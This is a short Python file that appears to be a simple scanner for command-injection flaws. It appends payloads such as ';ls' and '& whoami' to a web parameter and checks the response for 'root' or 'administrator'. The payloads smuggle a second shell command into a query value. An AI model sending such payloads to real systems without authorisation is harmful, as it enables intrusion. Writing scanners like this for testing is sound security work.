import requests


class RCETester:
    """
    Class for testing Remote Code Execution (RCE) vulnerabilities in a web application.
    Args:
        target_url (str): The URL of the target web application.
        param (str): The parameter to test for RCE vulnerabilities.
    Attributes:
        target_url (str): The URL of the target web application.
        param (str): The parameter to test for RCE vulnerabilities.
        payloads (list): A list of payloads to test for RCE.
    Methods:
        run_test(): Executes the RCE test by sending requests with different payloads and returns the results.
    """
    """
    Executes the RCE test by sending requests with different payloads and returns the results.
    Returns:
        list: A list of tuples containing the payload and a boolean indicating if the RCE vulnerability is present.
    """

    def __init__(self, target_url, param):
        self.target_url = target_url
        self.param = param
        self.payloads = [";ls", "& whoami"]

    def run_test(self):
        results = []
        for payload in self.payloads:
            test_url = f"{self.target_url}?{self.param}={payload}"
            response = requests.get(test_url)
            if "root" in response.text or "administrator" in response.text:
                results.append((payload, True))
            else:
                results.append((payload, False))
        return results
